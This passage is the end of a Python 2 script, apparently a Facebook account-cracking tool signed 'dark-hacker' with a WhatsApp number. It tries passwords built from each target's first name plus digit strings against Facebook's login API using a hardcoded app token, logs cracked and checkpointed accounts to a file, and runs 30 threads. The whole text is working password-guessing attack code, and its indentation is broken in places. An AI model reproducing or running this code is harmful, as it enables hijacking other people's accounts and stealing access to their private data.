														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass10
														oks.append(user+pass10)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass10
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass10+"\n")
															cek.close()
															cekpoint.append(user+pass10)
                                                                              else:
													pass11 = (j['first_name']+'404040')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass11
														oks.append(user+pass11)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass11
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass11+"\n")
															cek.close()
															cekpoint.append(user+pass11)
                                                                              else:
													pass12 = (j['first_name']+'505050')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass12
														oks.append(user+pass12)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass12
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass12+"\n")
															cek.close()
															cekpoint.append(user+pass12)
													else:
													pass13 = (j['first_name']+'606060')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass13
														oks.append(user+pass13)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass13
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass13+"\n")
															cek.close()
															cekpoint.append(user+pass13)
													else:
													pass14 = (j['first_name']+'707070')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass14
														oks.append(user+pass14)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass14
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass14+"\n")
															cek.close()
															cekpoint.append(user+pass14)
															else:
													pass15 = (j['first_name']+'808080')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass15
														oks.append(user+pass15)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass15
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass15+"\n")
															cek.close()
															cekpoint.append(user+pass15)
															else:
													pass16 = (j['first_name']+'909090')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass16)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass16
														oks.append(user+pass16)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass16
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass16+"\n")
															cek.close()
															cekpoint.append(user+pass16)
															else:
													pass17 = (j['first_name']+'121212')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass17
														oks.append(user+pass17)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass17
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass17+"\n")
															cek.close()
															cekpoint.append(user+pass17)
													else:
													pass18 = (j['first_name']+'343434')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass18)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass18
														oks.append(user+pass18)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass18
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass18+"\n")
															cek.close()
															cekpoint.append(user+pass18)
													else:
													pass19 = (j['first_name']+'565656')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass19)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass19
														oks.append(user+pass19)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass19
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass19+"\n")
															cek.close()
															cekpoint.append(user+pass19)
													else:
													a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
													b = json.loads(a.text)
													pass20 = (j['first_name']+'969696')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass20)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass20
														oks.append(user+pass20)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass20
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass20+"\n")
															cek.close()
															cekpoint.append(user+pass20)



																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDarkZ\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"
	print "  \033[1;91mВ«---вЂўв—€вЂў---Developed By dark-hacker--вЂўв—€вЂў---В»" #Dev:darkz_hacker
	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print """
             в–’в–’в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–’
             в–’в–’в–’в–’в–’в–€в–’в–€в–’в–€в–’в–’в–’в–€в–’в–€в–’в–€в–’в–’
             в–’в–’в–’в–€в–€в–€в–’в–€в–’в–€в–’в–€в–€в–€в–’в–€в–’в–€в–’в–’
             в–’в–’в–’в–€в–’в–’в–’в–€в–’в–€в–’в–€в–’в–’в–’в–€в–’в–€в–’в–’
             в–’в–’в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–’
в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤.
: \033[1;93m.darkhacker  Dark Z.... \033[1;93m :
в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤.' 
                whatsapp Num
               +8801978066581"""
	
	raw_input("\n\033[1;93m[\033[1;91mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	login()
